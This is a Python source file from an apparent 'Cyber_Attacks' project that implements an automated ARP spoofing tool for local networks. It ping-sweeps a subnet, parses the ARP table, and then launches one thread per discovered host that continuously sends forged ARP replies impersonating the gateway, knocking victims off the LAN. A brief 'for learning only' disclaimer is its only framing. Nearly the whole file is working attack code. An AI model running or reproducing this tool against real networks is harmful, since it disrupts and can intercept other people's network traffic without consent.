# -*- coding : utf-8 -*-
# Time       : 2021/4/8 11:24
# Author     : MurphyHou
# Proj_Name  : Cyber_Attacks
# File_Name  : test.py
# Software   : PyCharm
# =======Here We Go!=======


from kamene.all import (
    ARP,
    Ether,
    sendp,
    conf,
    srp
)
import threading
import os
import uuid
from socket import gethostbyname, gethostname
import time
import multiprocessing


class Kill(threading.Thread):
    def __init__(self, hacker_mac, hacker_ip, enemy_mac, enemy_ip):
        """
        # LAN Blasting Only
        :param Hacker_ip: hacker ip address--黑客的ip地址
        :param Hacker_mac: hacker mac physical  address--黑客的mac物理地址
        :param Enemy_ip:IP of the attacked--被攻击者的ip地址
        :param Enemy_mac:Physical MAC address of the attackee--被攻击者的物理mac地址
        """
        super().__init__()
        # init package--初始化包
        self.hacker_ip_address = hacker_ip
        self.hacker_mac_address = hacker_mac
        self.enemy_ip_address = enemy_ip
        self.enemy_mac_address = enemy_mac

    def run(self):
        thread = threading.Thread(target=self.attack)
        thread.start()

    def attack(self):
        eth = Ether()
        arp = ARP(
            op="is-at",
            hwsrc=self.hacker_mac_address,
            psrc=self.hacker_ip_address + ".1",
            hwdst=self.enemy_mac_address,
            pdst=self.enemy_ip_address,
        )
        print("\033[1;31;38m攻击已开启--Attack has been opened---攻击初始化成功")
        time.sleep(1)
        print(
            "\033[0;29;38m目标ip:%s----目标mac:%s----我的mac:%s" % (
                self.enemy_ip_address, self.enemy_ip_address, self.hacker_mac_address))
        (eth / arp).show()
        sendp(eth / arp, inter=2, loop=1)

    def copy_right(self):
        return "此工具由沫编写，可用于对同一局域网下的人进行高强度攻击！\n只用于为学习交流，请勿对他人故意造成攻击，损失他人利益" \
               "\n作者QQ:2366626231"


# get host mac address -- 48bit -- 获取自身mac地址，为攻击做铺垫
def get_mac_address():
    node = uuid.getnode()
    mac = uuid.UUID(int=node).hex[-12:]
    i = 1
    x = 2
    mac_date = list(mac)
    while i <= len(mac_date):
        if i // x == 1:
            mac_date.insert(i, ":")
            x += 3
        i += 1
    else:
        mac_date.pop()
    null_text = ""
    ite = null_text.join(mac_date)
    ite = ite.upper()
    return ite


class Ping(threading.Thread):
    def __init__(self, ip):
        super().__init__()
        self.ip_address = ip

    def run(self):
        os.system('ping -c 1 ' + self.ip_address)


def logo():
    print("\033[0;31;38m此工具由沫编写，可用于对同一局域网下的人进行高强度攻击！\n只用于为学习交流，请勿对他人故意造成攻击，损失他人利益\n作者QQ:2366626231"
          "\n\n5秒后程序开始执行")


def get_ip_mac():
    # 　all user data save position ,type = list
    ip_mac = []
    with open("mac_地址.txt", "r", encoding="utf-8") as f:
        for i in range(256):
            info = {}
            content = f.readline()
            if content != "":
                # get client text index number----gain ip address
                index_one = content.find("(")
                index_two = content.find(")")
                index_three = content.find("<")
                # get client text index number----gain mac address
                index_four = content.find("位于 ")
                index_five = content.find(" [ether]")
                if index_three == -1:
                    info["ip"] = content[index_one + 1:index_two]
                    info["mac"] = content[index_four + 3:index_five]

                    ip_mac.append(info)
            else:
                # if text content is null,break code
                break
        print("\033[0;29;38m扫描完成，3秒后开始执行攻击，扫描信息已保存运行目录。")
        time.sleep(3)
        return ip_mac


def get_ip_mac_text(ip):
    print("\033[0;31;38m已开启自动扫描，为了让攻击变得更加强力，预计１－－３分钟内完成扫描！！")
    for i in range(1, 256):
        s = Ping(ip + "." + str(i))
        s.start()
    else:
        # set timeout 30 m ---- wait arp data
        time.sleep(30)
        os.system('arp -a>./mac_地址.txt')
        print("\033[0;34;38m已完成扫描---准备开始分配线程，进行攻击")
    # start reading
    return get_ip_mac()


def main():
    logo()
    time.sleep(5)
    while True:
        option = input("\033[0;29;38m是否开启自动托管型攻击yes or no:\n")
        is_mult = input("\033[0;29;38m是否对整个网段进行攻击yes or no:\n")
        if option == "yes":
            if is_mult == "yes":
                ip_address = input("\033[0;29;38m请输入这个网段的地址－－例如192.168.15:\n")
                ip_mac = get_ip_mac_text(ip_address)
                time.sleep(2)
                for x in ip_mac:
                    ip = x["ip"]
                    mac = x["mac"]
                    p = Kill(get_mac_address(), ip_address, mac, ip)
                    p.start()
                    time.sleep(0.1)
        else:
            print("Error")
    # print("\033[1;34;38m是否开启")
    # make thread object
    #
    # p.start()
    # 无法执行此命令
    # print(get_mac_address())
    # print(host)


if __name__ == '__main__':
    main()
